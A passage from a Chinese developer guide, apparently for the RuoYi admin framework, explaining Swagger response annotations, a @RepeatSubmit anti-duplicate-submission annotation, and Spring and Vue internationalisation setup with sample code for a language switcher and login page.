<pre><code class="prism language-java"><span class="token annotation punctuation">@ApiResponses</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span> <span class="token annotation punctuation">@ApiResponse</span><span class="token punctuation">(</span>code <span class="token operator">=</span> <span class="token number">400</span><span class="token punctuation">,</span> message <span class="token operator">=</span> <span class="token string">"无效的用户"</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<p>与<code>Controller</code>中的方法并列使用，属性配置：</p>
<table><thead><tr><th>属性名称</th><th>备注</th></tr></thead><tbody><tr><td>value</td><td>多个ApiResponse配置</td></tr></tbody></table>
<p><code>ResponseHeader</code>标记，响应头设置，使用方法</p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@ResponseHeader</span><span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">"head"</span><span class="token punctuation">,</span>description<span class="token operator">=</span><span class="token string">"响应头设计"</span><span class="token punctuation">)</span>
</code></pre>
<p>与<code>Controller</code>中的方法并列使用，属性配置：</p>
<table><thead><tr><th>属性名称</th><th>备注</th></tr></thead><tbody><tr><td>name</td><td>响应头名称</td></tr><tr><td>description</td><td>描述</td></tr><tr><td>response</td><td>默认响应类 void</td></tr><tr><td>responseContainer</td><td>参考ApiOperation中配置</td></tr></tbody></table>
<h2><a id="_3186"></a>十九、防重复提交</h2>
<p>在接口方法上添加<code>@RepeatSubmit</code>注解即可，注解参数说明：</p>
<table><thead><tr><th>参数</th><th>类型</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>interval</td><td>int</td><td>5000</td><td>间隔时间(ms)，小于此时间视为重复提交</td></tr><tr><td>message</td><td>String</td><td>不允许重复提交，请稍后再试</td><td>提示消息</td></tr></tbody></table>
<p><strong>示例1：采用默认参数</strong></p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@RepeatSubmit</span>
<span class="token keyword">public</span> <span class="token class-name">AjaxResult</span> <span class="token function">addSave</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">return</span> <span class="token function">success</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p><strong>示例2：指定防重复时间和错误消息</strong></p>
<pre><code class="prism language-java"><span class="token annotation punctuation">@RepeatSubmit</span><span class="token punctuation">(</span>interval <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">,</span> message <span class="token operator">=</span> <span class="token string">"请求过于频繁"</span><span class="token punctuation">)</span>
<span class="token keyword">public</span> <span class="token class-name">AjaxResult</span> <span class="token function">addSave</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">return</span> <span class="token function">success</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<h2><a id="_3217"></a>二十、国际化支持</h2>
<p>在我们开发WEB项目的时候，项目可能涉及到在国外部署或者应用，也有可能会有国外的用户对项目进行访问，那么在这种项目中， 为客户展现的页面或者操作的信息就需要使用不同的语言，这就是我们所说的项目国际化。 目前项目已经支持多语言国际化，接下来我们介绍如何使用。</p>
<h3><a id="1_3221"></a>1、后台国际化流程</h3>
<p>1、修改<code>I18nConfig</code>设置默认语言，如默认<code>中文</code>：</p>
<pre><code class="prism language-java"><span class="token comment">// 默认语言，英文可以设置Locale.US</span>
slr<span class="token punctuation">.</span><span class="token function">setDefaultLocale</span><span class="token punctuation">(</span><span class="token class-name">Locale</span><span class="token punctuation">.</span>SIMPLIFIED_CHINESE<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>2、修改配置<code>application.yml</code>中的<code>basename</code>国际化文件，默认是<code>i18n</code>路径下<code>messages</code>文件<br/> （比如现在国际化文件是<code>xx_zh_CN.properties</code>、<code>xx_en_US.properties</code>，那么<code>basename</code>配置应为是<code>i18n/xx</code></p>
<pre><code class="prism language-yml"><span class="token key atrule">spring</span><span class="token punctuation">:</span>
  <span class="token comment"># 资源信息</span>
  <span class="token key atrule">messages</span><span class="token punctuation">:</span>
    <span class="token comment"># 国际化资源文件路径</span>
    <span class="token key atrule">basename</span><span class="token punctuation">:</span> static/i18n/messages
</code></pre>
<p>3、<code>i18n</code>目录文件下定义资源文件<br/> 美式英语 <code>messages_en_US.properties</code></p>
<pre><code class="prism language-properties">user.login.username=User name
user.login.password=Password
user.login.code=Security code
user.login.remember=Remember me
user.login.submit=Sign In
</code></pre>
<p>中文简体 <code>messages_zh_CN.properties</code></p>
<pre><code class="prism language-properties">user.login.username=用户名
user.login.password=密码
user.login.code=验证码
user.login.remember=记住我
user.login.submit=登录
</code></pre>
<p>4、java代码使用<code>MessageUtils</code>获取国际化</p>
<pre><code class="prism language-java"><span class="token class-name">MessageUtils</span><span class="token punctuation">.</span><span class="token function">message</span><span class="token punctuation">(</span><span class="token string">"user.login.username"</span><span class="token punctuation">)</span>
<span class="token class-name">MessageUtils</span><span class="token punctuation">.</span><span class="token function">message</span><span class="token punctuation">(</span><span class="token string">"user.login.password"</span><span class="token punctuation">)</span>
<span class="token class-name">MessageUtils</span><span class="token punctuation">.</span><span class="token function">message</span><span class="token punctuation">(</span><span class="token string">"user.login.code"</span><span class="token punctuation">)</span>
<span class="token class-name">MessageUtils</span><span class="token punctuation">.</span><span class="token function">message</span><span class="token punctuation">(</span><span class="token string">"user.login.remember"</span><span class="token punctuation">)</span>
<span class="token class-name">MessageUtils</span><span class="token punctuation">.</span><span class="token function">message</span><span class="token punctuation">(</span><span class="token string">"user.login.submit"</span><span class="token punctuation">)</span>
</code></pre>
<h3><a id="2_3272"></a>2、前端国际化流程</h3>
<p>1、<code>package.json</code>中<code>dependencies</code>节点添加<code>vue-i18n</code></p>
<pre><code class="prism language-json"><span class="token string">"vue-i18n"</span><span class="token operator">:</span> <span class="token string">"7.3.2"</span><span class="token punctuation">,</span>
</code></pre>
<p>1</p>
<p>2、<code>src</code>目录下创建lang目录，存放国际化文件<br/> 此处包含三个文件，分别是 <code>index.js</code> <code>zh.js</code> <code>en.js</code></p>
<pre><code class="prism language-javascript"><span class="token comment">// index.js</span>
<span class="token keyword">import</span> Vue <span class="token keyword">from</span> <span class="token string">'vue'</span>
<span class="token keyword">import</span> VueI18n <span class="token keyword">from</span> <span class="token string">'vue-i18n'</span>
<span class="token keyword">import</span> Cookies <span class="token keyword">from</span> <span class="token string">'js-cookie'</span>
<span class="token keyword">import</span> elementEnLocale <span class="token keyword">from</span> <span class="token string">'element-ui/lib/locale/lang/en'</span> <span class="token comment">// element-ui lang</span>
<span class="token keyword">import</span> elementZhLocale <span class="token keyword">from</span> <span class="token string">'element-ui/lib/locale/lang/zh-CN'</span><span class="token comment">// element-ui lang</span>
<span class="token keyword">import</span> enLocale <span class="token keyword">from</span> <span class="token string">'./en'</span>
<span class="token keyword">import</span> zhLocale <span class="token keyword">from</span> <span class="token string">'./zh'</span>

Vue<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>VueI18n<span class="token punctuation">)</span>

<span class="token keyword">const</span> messages <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
  en<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
    <span class="token operator">...</span>enLocale<span class="token punctuation">,</span>
    <span class="token operator">...</span>elementEnLocale
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  zh<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
    <span class="token operator">...</span>zhLocale<span class="token punctuation">,</span>
    <span class="token operator">...</span>elementZhLocale
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">const</span> i18n <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VueI18n</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span>
  <span class="token comment">// 设置语言 选项 en | zh</span>
  locale<span class="token operator">:</span> Cookies<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'language'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">'en'</span><span class="token punctuation">,</span>
  <span class="token comment">// 设置文本内容</span>
  messages
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> i18n
</code></pre>
<pre><code class="prism language-javascript"><span class="token comment">// zh.js</span>
<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{<!-- --></span>
  login<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
    title<span class="token operator">:</span> <span class="token string">'若依后台管理系统'</span><span class="token punctuation">,</span>
    logIn<span class="token operator">:</span> <span class="token string">'登录'</span><span class="token punctuation">,</span>
    username<span class="token operator">:</span> <span class="token string">'账号'</span><span class="token punctuation">,</span>
    password<span class="token operator">:</span> <span class="token string">'密码'</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  tagsView<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
    refresh<span class="token operator">:</span> <span class="token string">'刷新'</span><span class="token punctuation">,</span>
    close<span class="token operator">:</span> <span class="token string">'关闭'</span><span class="token punctuation">,</span>
    closeOthers<span class="token operator">:</span> <span class="token string">'关闭其它'</span><span class="token punctuation">,</span>
    closeAll<span class="token operator">:</span> <span class="token string">'关闭所有'</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  settings<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
    title<span class="token operator">:</span> <span class="token string">'系统布局配置'</span><span class="token punctuation">,</span>
    theme<span class="token operator">:</span> <span class="token string">'主题色'</span><span class="token punctuation">,</span>
    tagsView<span class="token operator">:</span> <span class="token string">'开启 Tags-View'</span><span class="token punctuation">,</span>
    fixedHeader<span class="token operator">:</span> <span class="token string">'固定 Header'</span><span class="token punctuation">,</span>
    sidebarLogo<span class="token operator">:</span> <span class="token string">'侧边栏 Logo'</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<pre><code class="prism language-javascript"><span class="token comment">// en.js</span>
<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{<!-- --></span>
  login<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
    title<span class="token operator">:</span> <span class="token string">'RuoYi Login Form'</span><span class="token punctuation">,</span>
    logIn<span class="token operator">:</span> <span class="token string">'Log in'</span><span class="token punctuation">,</span>
    username<span class="token operator">:</span> <span class="token string">'Username'</span><span class="token punctuation">,</span>
    password<span class="token operator">:</span> <span class="token string">'Password'</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  tagsView<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
    refresh<span class="token operator">:</span> <span class="token string">'Refresh'</span><span class="token punctuation">,</span>
    close<span class="token operator">:</span> <span class="token string">'Close'</span><span class="token punctuation">,</span>
    closeOthers<span class="token operator">:</span> <span class="token string">'Close Others'</span><span class="token punctuation">,</span>
    closeAll<span class="token operator">:</span> <span class="token string">'Close All'</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  settings<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
    title<span class="token operator">:</span> <span class="token string">'Page style setting'</span><span class="token punctuation">,</span>
    theme<span class="token operator">:</span> <span class="token string">'Theme Color'</span><span class="token punctuation">,</span>
    tagsView<span class="token operator">:</span> <span class="token string">'Open Tags-View'</span><span class="token punctuation">,</span>
    fixedHeader<span class="token operator">:</span> <span class="token string">'Fixed Header'</span><span class="token punctuation">,</span>
    sidebarLogo<span class="token operator">:</span> <span class="token string">'Sidebar Logo'</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>3、在<code>src/main.js</code>中增量添加i18n</p>
<pre><code class="prism language-javascript"><span class="token keyword">import</span> i18n <span class="token keyword">from</span> <span class="token string">'./lang'</span>

<span class="token comment">// use添加i18n</span>
Vue<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>Element<span class="token punctuation">,</span> <span class="token punctuation">{<!-- --></span>
  <span class="token function-variable function">i18n</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">key<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> i18n<span class="token punctuation">.</span><span class="token function">t</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span>
  i18n<span class="token punctuation">,</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<p>4、在<code>src/store/getters.js</code>中添加language</p>
<pre><code class="prism language-javascript"><span class="token function-variable function">language</span><span class="token operator">:</span> <span class="token parameter">state</span> <span class="token operator">=&gt;</span> state<span class="token punctuation">.</span>app<span class="token punctuation">.</span>language<span class="token punctuation">,</span>
</code></pre>
<p>15、在<code>src/store/modules/app.js</code>中增量添加i18n</p>
<pre><code class="prism language-javascript"><span class="token keyword">const</span> state <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
  language<span class="token operator">:</span> Cookies<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'language'</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">'en'</span>
<span class="token punctuation">}</span>

<span class="token keyword">const</span> mutations <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
  <span class="token function-variable function">SET_LANGUAGE</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">state<span class="token punctuation">,</span> language</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
    state<span class="token punctuation">.</span>language <span class="token operator">=</span> language
    Cookies<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'language'</span><span class="token punctuation">,</span> language<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">const</span> actions <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
  <span class="token function">setLanguage</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{<!-- --></span> commit <span class="token punctuation">}</span><span class="token punctuation">,</span> language</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token function">commit</span><span class="token punctuation">(</span><span class="token string">'SET_LANGUAGE'</span><span class="token punctuation">,</span> language<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>6、在<code>src/components/LangSelect/index.vue</code>中创建汉化组件</p>
<pre><code class="prism language-javascript"><span class="token operator">&lt;</span>template<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>el<span class="token operator">-</span>dropdown trigger<span class="token operator">=</span><span class="token string">"click"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"international"</span> @command<span class="token operator">=</span><span class="token string">"handleSetLanguage"</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>div<span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span>svg<span class="token operator">-</span>icon <span class="token keyword">class</span><span class="token operator">-</span>name<span class="token operator">=</span><span class="token string">"international-icon"</span> icon<span class="token operator">-</span><span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"language"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>el<span class="token operator">-</span>dropdown<span class="token operator">-</span>menu slot<span class="token operator">=</span><span class="token string">"dropdown"</span><span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span>el<span class="token operator">-</span>dropdown<span class="token operator">-</span>item <span class="token operator">:</span>disabled<span class="token operator">=</span><span class="token string">"language==='zh'"</span> command<span class="token operator">=</span><span class="token string">"zh"</span><span class="token operator">&gt;</span>
        中文
      <span class="token operator">&lt;</span><span class="token operator">/</span>el<span class="token operator">-</span>dropdown<span class="token operator">-</span>item<span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span>el<span class="token operator">-</span>dropdown<span class="token operator">-</span>item <span class="token operator">:</span>disabled<span class="token operator">=</span><span class="token string">"language==='en'"</span> command<span class="token operator">=</span><span class="token string">"en"</span><span class="token operator">&gt;</span>
        English
      <span class="token operator">&lt;</span><span class="token operator">/</span>el<span class="token operator">-</span>dropdown<span class="token operator">-</span>item<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>el<span class="token operator">-</span>dropdown<span class="token operator">-</span>menu<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>el<span class="token operator">-</span>dropdown<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>template<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{<!-- --></span>
  computed<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
    <span class="token function">language</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
      <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>$store<span class="token punctuation">.</span>getters<span class="token punctuation">.</span>language
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  methods<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
    <span class="token function">handleSetLanguage</span><span class="token punctuation">(</span><span class="token parameter">lang</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>$i18n<span class="token punctuation">.</span>locale <span class="token operator">=</span> lang
      <span class="token keyword">this</span><span class="token punctuation">.</span>$store<span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token string">'app/setLanguage'</span><span class="token punctuation">,</span> lang<span class="token punctuation">)</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$message</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span>
        message<span class="token operator">:</span> <span class="token string">'设置语言成功'</span><span class="token punctuation">,</span>
        type<span class="token operator">:</span> <span class="token string">'success'</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
</code></pre>
<p>7、登录页面汉化</p>
<pre><code class="prism language-javascript"><span class="token operator">&lt;</span>template<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"login"</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>el<span class="token operator">-</span>form ref<span class="token operator">=</span><span class="token string">"loginForm"</span> <span class="token operator">:</span>model<span class="token operator">=</span><span class="token string">"loginForm"</span> <span class="token operator">:</span>rules<span class="token operator">=</span><span class="token string">"loginRules"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"login-form"</span><span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span>h3 <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"title"</span><span class="token operator">&gt;</span><span class="token punctuation">{<!-- --></span><span class="token punctuation">{<!-- --></span> <span class="token function">$t</span><span class="token punctuation">(</span><span class="token string">'login.title'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>h3<span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span>lang<span class="token operator">-</span>select <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"set-language"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span>el<span class="token operator">-</span>form<span class="token operator">-</span>item prop<span class="token operator">=</span><span class="token string">"username"</span><span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>el<span class="token operator">-</span>input v<span class="token operator">-</span>model<span class="token operator">=</span><span class="token string">"loginForm.username"</span> type<span class="token operator">=</span><span class="token string">"text"</span> auto<span class="token operator">-</span>complete<span class="token operator">=</span><span class="token string">"off"</span> <span class="token operator">:</span>placeholder<span class="token operator">=</span><span class="token string">"$t('login.username')"</span><span class="token operator">&gt;</span>
          <span class="token operator">&lt;</span>svg<span class="token operator">-</span>icon slot<span class="token operator">=</span><span class="token string">"prefix"</span> icon<span class="token operator">-</span><span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"user"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"el-input__icon input-icon"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span><span class="token operator">/</span>el<span class="token operator">-</span>input<span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span><span class="token operator">/</span>el<span class="token operator">-</span>form<span class="token operator">-</span>item<span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span>el<span class="token operator">-</span>form<span class="token operator">-</span>item prop<span class="token operator">=</span><span class="token string">"password"</span><span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>el<span class="token operator">-</span>input
          v<span class="token operator">-</span>model<span class="token operator">=</span><span class="token string">"loginForm.password"</span>
          type<span class="token operator">=</span><span class="token string">"password"</span>
          auto<span class="token operator">-</span>complete<span class="token operator">=</span><span class="token string">"off"</span>
          <span class="token operator">:</span>placeholder<span class="token operator">=</span><span class="token string">"$t('login.password')"</span>
          @keyup<span class="token punctuation">.</span>enter<span class="token punctuation">.</span>native<span class="token operator">=</span><span class="token string">"handleLogin"</span>
        <span class="token operator">&gt;</span>
          <span class="token operator">&lt;</span>svg<span class="token operator">-</span>icon slot<span class="token operator">=</span><span class="token string">"prefix"</span> icon<span class="token operator">-</span><span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"password"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"el-input__icon input-icon"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span><span class="token operator">/</span>el<span class="token operator">-</span>input<span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span><span class="token operator">/</span>el<span class="token operator">-</span>form<span class="token operator">-</span>item<span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span>el<span class="token operator">-</span>form<span class="token operator">-</span>item prop<span class="token operator">=</span><span class="token string">"code"</span><span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>el<span class="token operator">-</span>input
          v<span class="token operator">-</span>model<span class="token operator">=</span><span class="token string">"loginForm.code"</span>
          auto<span class="token operator">-</span>complete<span class="token operator">=</span><span class="token string">"off"</span>
          placeholder<span class="token operator">=</span><span class="token string">"验证码"</span>
          style<span class="token operator">=</span><span class="token string">"width: 63%"</span>
          @keyup<span class="token punctuation">.</span>enter<span class="token punctuation">.</span>native<span class="token operator">=</span><span class="token string">"handleLogin"</span>
        <span class="token operator">&gt;</span>
          <span class="token operator">&lt;</span>svg<span class="token operator">-</span>icon slot<span class="token operator">=</span><span class="token string">"prefix"</span> icon<span class="token operator">-</span><span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"validCode"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"el-input__icon input-icon"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span><span class="token operator">/</span>el<span class="token operator">-</span>input<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"login-code"</span><span class="token operator">&gt;</span>
          <span class="token operator">&lt;</span>img <span class="token operator">:</span>src<span class="token operator">=</span><span class="token string">"codeUrl"</span> @click<span class="token operator">=</span><span class="token string">"getCode"</span> <span class="token operator">/</span><span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span><span class="token operator">/</span>el<span class="token operator">-</span>form<span class="token operator">-</span>item<span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span>el<span class="token operator">-</span>checkbox v<span class="token operator">-</span>model<span class="token operator">=</span><span class="token string">"loginForm.rememberMe"</span> style<span class="token operator">=</span><span class="token string">"margin:0px 0px 25px 0px;"</span><span class="token operator">&gt;</span>记住密码<span class="token operator">&lt;</span><span class="token operator">/</span>el<span class="token operator">-</span>checkbox<span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span>el<span class="token operator">-</span>form<span class="token operator">-</span>item style<span class="token operator">=</span><span class="token string">"width:100%;"</span><span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span>el<span class="token operator">-</span>button
          <span class="token operator">:</span>loading<span class="token operator">=</span><span class="token string">"loading"</span>
          size<span class="token operator">=</span><span class="token string">"medium"</span>
          type<span class="token operator">=</span><span class="token string">"primary"</span>
          style<span class="token operator">=</span><span class="token string">"width:100%;"</span>
          @click<span class="token punctuation">.</span>native<span class="token punctuation">.</span>prevent<span class="token operator">=</span><span class="token string">"handleLogin"</span>
        <span class="token operator">&gt;</span>
          <span class="token operator">&lt;</span>span v<span class="token operator">-</span><span class="token keyword">if</span><span class="token operator">=</span><span class="token string">"!loading"</span><span class="token operator">&gt;</span><span class="token punctuation">{<!-- --></span><span class="token punctuation">{<!-- --></span> <span class="token function">$t</span><span class="token punctuation">(</span><span class="token string">'login.logIn'</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">&gt;</span>
          <span class="token operator">&lt;</span>span v<span class="token operator">-</span><span class="token keyword">else</span><span class="token operator">&gt;</span>登 录 中<span class="token operator">...</span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">&gt;</span>
        <span class="token operator">&lt;</span><span class="token operator">/</span>el<span class="token operator">-</span>button<span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span><span class="token operator">/</span>el<span class="token operator">-</span>form<span class="token operator">-</span>item<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>el<span class="token operator">-</span>form<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>  底部  <span class="token operator">--</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"el-login-footer"</span><span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span>span<span class="token operator">&gt;</span>Copyright © <span class="token number">2018</span><span class="token operator">-</span><span class="token number">2019</span> ruoyi<span class="token punctuation">.</span>vip All Rights Reserved<span class="token punctuation">.</span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>template<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>script<span class="token operator">&gt;</span>
<span class="token keyword">import</span> LangSelect <span class="token keyword">from</span> <span class="token string">'@/components/LangSelect'</span>
<span class="token keyword">import</span> <span class="token punctuation">{<!-- --></span> getCodeImg <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">"@/api/login"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> Cookies <span class="token keyword">from</span> <span class="token string">"js-cookie"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token punctuation">{<!-- --></span> encrypt<span class="token punctuation">,</span> decrypt <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@/utils/jsencrypt'</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{<!-- --></span>
  name<span class="token operator">:</span> <span class="token string">"Login"</span><span class="token punctuation">,</span>
  components<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span> LangSelect <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">return</span> <span class="token punctuation">{<!-- --></span>
      codeUrl<span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
      cookiePassword<span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
      loginForm<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
        username<span class="token operator">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>
        password<span class="token operator">:</span> <span class="token string">"admin123"</span><span class="token punctuation">,</span>
        rememberMe<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
        code<span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>
        uuid<span class="token operator">:</span> <span class="token string">""</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      loginRules<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
        username<span class="token operator">:</span> <span class="token punctuation">[</span>
          <span class="token punctuation">{<!-- --></span> required<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> trigger<span class="token operator">:</span> <span class="token string">"blur"</span><span class="token punctuation">,</span> message<span class="token operator">:</span> <span class="token string">"用户名不能为空"</span> <span class="token punctuation">}</span>
        <span class="token punctuation">]</span><span class="token punctuation">,</span>
